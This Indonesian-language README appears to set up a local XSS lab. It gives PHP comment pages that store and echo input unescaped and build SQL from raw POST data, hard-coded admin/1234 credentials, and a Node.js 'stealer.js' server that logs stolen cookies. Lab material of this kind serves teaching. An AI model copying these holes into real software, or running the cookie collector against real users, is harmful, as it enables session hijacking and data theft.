# 🔒 Eksperimen Keamanan Web: Cross-Site Scripting (XSS)

Eksperimen ini mendemonstrasikan dua jenis serangan XSS (Reflected dan Stored) secara lokal menggunakan XAMPP dan Node.js. Tujuannya adalah untuk memahami cara kerja XSS dan cara mitigasinya.

---

## 🧰 Persiapan Lingkungan

### ✅ Alat yang Dibutuhkan
- [XAMPP](https://www.apachefriends.org/index.html) (Apache & MySQL)
- [Node.js](https://nodejs.org)
- Web browser (Chrome/Firefox)
- Text editor (VS Code/Notepad++)

---

## 📁 Struktur Direktori
xss_advanced/

		├── comment_form.php
		├── save_comment.php
		├── view_comments.php
		├── dashboard.php
		├── login.php
		├── logout.php
		├── db.php
		├── style.css
		└── xss_listener/
		└── server.js

---

## ⚙️ Setup Database MySQL

### 1. Buat Database Baru
Masuk ke `http://localhost/phpmyadmin`, buat database baru bernama `xss_advanced`.

### 2. Jalankan SQL Berikut:
	```sql
	CREATE TABLE `comments` (
	  `id` INT AUTO_INCREMENT PRIMARY KEY,
	  `username` VARCHAR(50),
	  `comment` TEXT
	);
	
	CREATE TABLE `users` (
	  `id` INT AUTO_INCREMENT PRIMARY KEY,
	  `username` VARCHAR(50),
	  `password` VARCHAR(255)
	);
	
	INSERT INTO users (username, password) VALUES ('admin', '1234');

---

## 🧱 Langkah-Langkah
### 1. Buat Login.php
	<?php
	session_start();
	if ($_POST) {
	    if ($_POST['username'] == 'admin' && $_POST['password'] == '1234') {
	        $_SESSION['username'] = 'admin';
	        header("Location: dashboard.php");
	        exit;
	    } else {
	        echo "Login gagal!";
	    }
	}
	?>
	
	<form method="POST">
	  Username: <input name="username"><br>
	  Password: <input name="password" type="password"><br>
	  <input type="submit" value="Login">
	</form>
### 2. Buat Dashboard.php
	<?php
	session_start();
	if (!isset($_SESSION['username'])) {
	    header("Location: login.php");
	    exit;
	}
	echo "Selamat datang, " . $_SESSION['username'] . "<br>";
	echo "<a href='comment_form.php'>Komentar</a>";
### 3. Buat comment_form.php
	<form action="save_comment.php" method="POST">
	    Username: <input type="text" name="username"><br>
	    Komentar: <textarea name="comment"></textarea><br>
	    <input type="submit" value="Kirim">
	</form>
### 4. Buat save_comment.php
	<?php
	$conn = new mysqli("localhost", "root", "", "xss_advanced");
	
	$username = $_POST['username'];
	$comment = $_POST['comment'];
	
	$conn->query("INSERT INTO comments (username, comment) VALUES ('$username', '$comment')");
	echo "Komentar berhasil disimpan.<br>";
	echo "<a href='view_comments.php'>Lihat Komentar</a>";
	?>
### 5. Buat view_comments.php
	<?php
	$conn = new mysqli("localhost", "root", "", "xss_advanced");
	$result = $conn->query("SELECT * FROM comments");
	
	while ($row = $result->fetch_assoc()) {
	    echo "<b>" . $row['username'] . "</b>: " . $row['comment'] . "<br><hr>";
	}
	?>
### 6. Buat db.php
	<?php
	$conn = new mysqli("localhost", "root", "", "xss_advanced");
	if ($conn->connect_error) {
	    die("Koneksi gagal: " . $conn->connect_error);
	}
	?>
### 7. Buat stealer.js
	const http = require('http');
	const fs = require('fs');
	
	http.createServer((req, res) => {
	    const url = require('url').parse(req.url, true);
	    if (url.pathname === '/steal') {
	        const log = `Stolen cookie: ${url.query.c}\n`;
	        fs.appendFileSync('stolen_cookies.txt', log);
	        res.end("OK");
	    } else {
	        res.end("Nothing here.");
	    }
	}).listen(1337);
	
	console.log("Listening on http://localhost:1337");
 ---
## 🔁 Simulasi
### Jalankan stealer.js dari terminal dengan cara:
	cd C:\xampp\htdocs\xss_advanced\stealer_server
	node stealer.js
maka Server akan listen di http://localhost:1337. Pastikan port 1337 tidak diblok firewall.
### Jalankan Web Server
buka browser dan jalankan: http://localhost/xss_advanced/login.php
### Login sebagai admin
isi:
Username: admin
Password: 1234






